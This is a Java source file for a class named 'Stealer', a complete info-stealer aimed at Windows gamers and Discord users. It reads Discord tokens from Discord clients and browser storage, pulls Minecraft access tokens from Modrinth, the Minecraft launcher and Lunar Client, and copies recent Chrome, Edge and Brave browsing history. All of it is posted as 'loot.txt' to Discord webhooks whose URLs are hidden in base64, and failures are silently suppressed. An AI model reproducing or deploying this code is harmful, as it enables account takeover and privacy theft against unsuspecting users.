package com.payload;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.sql.*;
import java.util.*;
import java.util.regex.*;

public class Stealer {
    
    private static final String W_COM_ENC = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3MDMwOTgyOTgzMzEzODI1Ni9PM1R0dkFrNnRDR3NhNjVwS3ZqODRsdlhPS0U4djFlMnk1RC1vRVd6QlpmVVZreEZoTEtLX1lSLVppVkZkNVRPRk1fUA==";
    private static final String W_APP_ENC = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTU3MDMwOTgyOTgzMzEzODI1Ni9PM1R0dkFrNnRDR3NhNjVwS3ZqODRsdlhPS0U4djFlMnk1RC1vRVd6QlpmVVZreEZoTEtLX1lSLVppVkZkNVRPRk1fUA==";

    public static void run() {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("=== SYSTEM INFO ===\n");
            sb.append("User: ").append(System.getProperty("user.name")).append("\n");
            sb.append("OS: ").append(System.getProperty("os.name")).append("\n");
            sb.append("IP: ").append(getIP()).append("\n\n");

            String discord = null;
            try { discord = getDiscord(); } catch (Exception e) {}
            
            String minecraft = null;
            try { minecraft = getMinecraft(); } catch (Exception e) {}

            sb.append("=== DISCORD TOKEN ===\n");
            if (discord != null) sb.append(discord).append("\n");
            else sb.append("(none found)\n");
            
            sb.append("\n=== MINECRAFT INFO ===\n");
            if (minecraft != null) {
                sb.append("Token: ").append(minecraft).append("\n");
                try {
                    String[] parts = minecraft.split("\\.");
                    if (parts.length == 3) {
                        String payloadB64 = parts[1];
                        while (payloadB64.length() % 4 != 0) payloadB64 += "="; 
                        String payload = new String(Base64.getUrlDecoder().decode(payloadB64), StandardCharsets.UTF_8);
                        
                        Matcher mName = Pattern.compile("\"name\"\\s*:\\s*\"([^\"]+)\"").matcher(payload);
                        Matcher mUuid = Pattern.compile("\"mc\"\\s*:\\s*\"([a-f0-9]+)\"").matcher(payload);
                        
                        if (mName.find()) sb.append("Username: ").append(mName.group(1)).append("\n");
                        if (mUuid.find()) {
                            String uuid = mUuid.group(1);
                            sb.append("UUID: ").append(uuid).append("\n");
                            sb.append("Skin Head: https://mc-heads.net/avatar/").append(uuid).append("/128\n");
                        }
                    }
                } catch (Exception ignored) {}
            } else {
                sb.append("(none found)\n");
            }

            sb.append("\n=== BROWSING HISTORY ===\n");
            try {
                sb.append(getHistory());
            } catch (Exception e) {
                sb.append("(failed to read history)\n");
            }

            String payload = sb.toString();
            
            boolean success = send(d(W_COM_ENC), payload);
            if (!success) send(d(W_APP_ENC), payload);

        } catch (Throwable t) {}
    }

    private static String d(String b64) {
        return new String(Base64.getDecoder().decode(b64), StandardCharsets.UTF_8);
    }

    private static String getHistory() {
        StringBuilder history = new StringBuilder();
        String local = System.getenv("LOCALAPPDATA");
        if (local == null) return "";

        String[][] chromiumBrowsers = {
            { local + "\\Google\\Chrome\\User Data", "Chrome" },
            { local + "\\Microsoft\\Edge\\User Data", "Edge" },
            { local + "\\BraveSoftware\\Brave-Browser\\User Data", "Brave" }
        };

        for (String[] browser : chromiumBrowsers) {
            File base = new File(browser[0]);
            if (!base.exists()) continue;
            File[] profiles = base.listFiles((dir, name) -> name.equals("Default") || name.startsWith("Profile "));
            if (profiles == null) continue;

            for (File profile : profiles) {
                File histDb = new File(profile, "History");
                if (!histDb.exists()) continue;
                try {
                    history.append("--- ").append(browser[1]).append(" (").append(profile.getName()).append(") ---\n");
                    history.append(extractChromiumHistory(histDb));
                } catch (Exception ignored) {}
            }
        }
        return history.toString();
    }

    private static String extractChromiumHistory(File dbFile) {
        StringBuilder res = new StringBuilder();
        File temp = new File(System.getProperty("java.io.tmpdir"), "hist_" + System.nanoTime() + ".db");
        try {
            Files.copy(dbFile.toPath(), temp.toPath(), StandardCopyOption.REPLACE_EXISTING);
            Class.forName("org.sqlite.JDBC");
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + temp.getAbsolutePath());
                 Statement stmt = conn.createStatement();
                 ResultSet rs = stmt.executeQuery("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 30")) {
                while (rs.next()) {
                    res.append(rs.getString("url")).append(" | ").append(rs.getString("title")).append("\n");
                }
            }
        } catch (Exception ignored) {
        } finally { temp.delete(); }
        return res.toString();
    }

    private static String getIP() {
        try {
            URL u = new URL("https://api.ipify.org");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(3000);
            try (InputStream in = c.getInputStream()) {
                return new String(in.readAllBytes(), StandardCharsets.UTF_8).trim();
            }
        } catch (Exception t) { return "Unknown"; }
    }

    private static boolean send(String urlStr, String text) {
        try {
            String boundary = "----WebKitFormBoundary" + Long.toHexString(System.nanoTime());
            HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            c.setDoOutput(true);

            try (OutputStream os = c.getOutputStream()) {
                os.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"loot.txt\"\r\nContent-Type: text/plain\r\n\r\n").getBytes(StandardCharsets.UTF_8));
                os.write(text.getBytes(StandardCharsets.UTF_8));
                os.write(("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
            }
            return (c.getResponseCode() >= 200 && c.getResponseCode() < 300);
        } catch (Exception e) { return false; }
    }

    private static String getDiscord() {
        String ad = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        if (ad == null || local == null) return null;
        
        List<String> paths = new ArrayList<>();
        paths.add(ad + "\\discord\\Local Storage\\leveldb");
        paths.add(ad + "\\discordcanary\\Local Storage\\leveldb");
        paths.add(ad + "\\discordptb\\Local Storage\\leveldb");
        paths.add(ad + "\\Lightcord\\Local Storage\\leveldb");
        paths.add(local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
        paths.add(local + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
        paths.add(local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");

        Pattern p = Pattern.compile("(mfa\\.[\\w-]{84}|[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{27,40})");

        for (String pathStr : paths) {
            File ld = new File(pathStr);
            if (!ld.exists()) continue;
            File[] files = ld.listFiles();
            if (files == null) continue;

            for (File f : files) {
                String n = f.getName();
                if (!n.endsWith(".ldb") && !n.endsWith(".log")) continue;
                try {
                    byte[] data = Files.readAllBytes(f.toPath());
                    Matcher m = p.matcher(new String(data, StandardCharsets.ISO_8859_1));
                    if (m.find()) return m.group(1);
                } catch (Exception ignored) {}
            }
        }
        return null;
    }

    private static boolean isValidToken(String token) {
        return token != null && token.length() > 80 && token.startsWith("eyJ") && token.split("\\.").length == 3 && !token.contains(" ");
    }

    private static String getMinecraft() {
        String ad = System.getenv("APPDATA");
        String home = System.getProperty("user.home");
        if (ad == null || home == null) return null;

        File modrinthDb = new File(ad + "\\ModrinthApp\\app.db");
        if (modrinthDb.exists()) {
            String tok = grabModrinthDB(modrinthDb);
            if (tok != null) return tok;
        }
        
        File modrinthDb2 = new File(ad + "\\com.modrinth.theseus\\app.db");
        if (modrinthDb2.exists()) {
            String tok = grabModrinthDB(modrinthDb2);
            if (tok != null) return tok;
        }

        String[] explicitFiles = {
            ad + "\\.minecraft\\launcher_msa_credentials.json",
            ad + "\\.minecraft\\launcher_accounts.json",
            ad + "\\.minecraft\\launcher_profiles.json",
            home + "\\.lunarclient\\settings\\game\\accounts.json"
        };

        Pattern p = Pattern.compile("\"(?:access_?[Tt]oken|accessToken)\"\\s*:\\s*\"([^\"]+)\"");
        for (String path : explicitFiles) {
            File f = new File(path);
            if (!f.exists()) continue;
            try {
                String json = new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8);
                Matcher m = p.matcher(json);
                while (m.find()) {
                    String tok = m.group(1);
                    if (isValidToken(tok)) return tok;
                }
            } catch (Exception ignored) {}
        }
        return null;
    }

    private static String grabModrinthDB(File dbFile) {
        File tempDb = new File(System.getProperty("java.io.tmpdir"), "modrinth_" + System.nanoTime() + ".db");
        try {
            Files.copy(dbFile.toPath(), tempDb.toPath(), StandardCopyOption.REPLACE_EXISTING);
            Class.forName("org.sqlite.JDBC");
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempDb.getAbsolutePath())) {
                Statement stmt = conn.createStatement();
                ResultSet rsTables = stmt.executeQuery("SELECT name FROM sqlite_master WHERE type='table'");
                List<String> tables = new ArrayList<>();
                while (rsTables.next()) tables.add(rsTables.getString("name"));
                for (String table : tables) {
                    if (table.equals("sqlite_sequence")) continue;
                    try (ResultSet rs = stmt.executeQuery("SELECT * FROM " + table)) {
                        ResultSetMetaData meta = rs.getMetaData();
                        int colCount = meta.getColumnCount();
                        while (rs.next()) {
                            for (int i = 1; i <= colCount; i++) {
                                String val = rs.getString(i);
                                if (isValidToken(val)) return val;
                            }
                        }
                    } catch (Exception ignored) {}
                }
            }
        } catch (Exception ignored) {
        } finally { tempDb.delete(); }
        return null;
    }
}
